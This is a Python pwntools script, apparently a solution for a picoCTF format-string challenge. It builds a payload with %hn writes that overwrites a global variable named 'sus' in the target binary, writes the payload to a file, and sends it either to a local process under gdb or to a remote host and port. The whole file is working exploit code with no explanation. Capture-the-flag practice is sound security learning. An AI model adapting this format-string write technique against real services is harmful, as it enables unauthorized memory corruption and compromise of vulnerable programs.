#!/usr/bin/env python3

import argparse
from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument("destination", type=str, choices={"local", "remote"})
parser.add_argument("--target", "-t", type=str, default="", required=False)
parser.add_argument("--port", "-p", type=int, default=0, required=False)
args = parser.parse_args()

elf = ELF("../Downloads/picoctf/form_string/vuln")

first_part = p64(elf.symbols.sus)
second_part = p64(elf.symbols.sus+2)

high_addr = 0x6761
low_addr = 0x6c66

high_number = high_addr
low_number = low_addr - high_addr

payload = b'%%%dx%%18$hn' % high_number + b'%%%dx%%19$hn' % low_number + b'\x00'*7 + second_part + first_part

print(payload)
payload += b"\n"

with open("payload", "wb") as file:
    file.write(payload)

if args.destination == "local":
    p = gdb.debug([elf.path])
elif args.destination == "remote":
    if not args.target or not args.port:
        pwn.warning("supply target and port")
        exit()
    p = pwn.remote(args.target, args.port)

#p.send("2")
#p.recv()

p.recv()
p.sendline(payload)
p.recv()
p.interactive()